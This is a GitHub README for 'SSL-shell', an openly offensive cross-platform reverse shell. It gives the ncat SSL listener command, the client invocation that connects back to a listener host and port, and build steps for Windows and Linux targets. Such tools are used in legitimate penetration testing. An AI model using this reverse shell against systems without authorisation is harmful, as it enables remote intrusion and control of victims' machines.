<div align="center">

# SSL reverse shell
[![Codacy Badge](https://app.codacy.com/project/badge/Grade/df078d96e7bc4e9ba52541563456d9f6)](https://app.codacy.com/gh/zedek1/SSL-shell/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)
![GitHub License](https://img.shields.io/github/license/zedek1/SSL-shell)

</div>


### Overview

This is a cross-platform SSL reverse shell with (soon to come) custom commands. No server-side code is needed as it works perfectly with ncat!

---

### Usage


Run ncat with the --ssl flag

```bash
nc -lnvp 8080 --ssl
```

specify lhost host and lport as command line arguments

```
C:\Users\User> sslshell.exe 192.168.48.73 8080
```

If lhost and/or lport is not given from the command-line it will use the compile definitions which are 127.0.0.1 and 8080 by default

---

**Building for Windows targets**

Compiling for windows targets from linux requires a small amount of setup to get openssl to work with mingw cross-compilation. Create a new directory and run the commands below

```bash
git clone https://github.com/openssl/openssl.git && cd openssl
./Configure --cross-compile-prefix=x86_64-w64-mingw32- mingw64
make
```

then in the Makefile replace the absolute path of the openssl directory into CFLAGS and LDFLAGS. These instructions are in Makfile as well. After that you should be able to compile successfully

```bash
make windows
```

---

**Using cmake**

alternatively you can compile on windows using cmake

```powershell
cmake -B build
cmake --build build --config Release
```

---

**Building for Linux targets**


```bash
make linux
```